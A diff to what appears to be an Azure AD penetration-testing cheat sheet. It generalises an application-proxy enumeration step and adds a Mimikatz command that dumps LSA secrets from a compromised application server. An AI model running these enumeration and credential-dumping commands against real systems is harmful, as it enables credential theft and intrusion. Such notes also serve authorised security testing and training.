@@ -104,15 +104,21 @@ Import-Module .\AzureAD.psd1
 Get-AzureADApplication | %{try{Get-AzureADApplicationProxyApplication -ObjectId $_.ObjectID;$_.DisplayName;$_.ObjectID}catch{}}
 ```
 
-#### Get the Service Principal
+#### Get the Service Principal (use the application name)
 ```
-Get-AzureADServicePrincipal -All $true | ?{$_.DisplayName -eq "Finance Management System"} 
+Get-AzureADServicePrincipal -All $true | ?{$_.DisplayName -eq "<APPLICATION NAME>"} 
 ```
 
 #### Find user and groups assigned to the application
 ```
 . .\Get-ApplicationProxyAssignedUsersAndGroups.ps1
 Get-ApplicationProxyAssignedUsersAndGroups -ObjectId <OBJECT ID OF SERVICE PRINCIPAL>
+```
+
+#### Extract secrets of service account
+- After compromising the application
+```
+Invoke-Mimikatz -Command '"token::elevate" "lsadump::secrets"'
 ```
 
 # On-Prem --> Azure AD
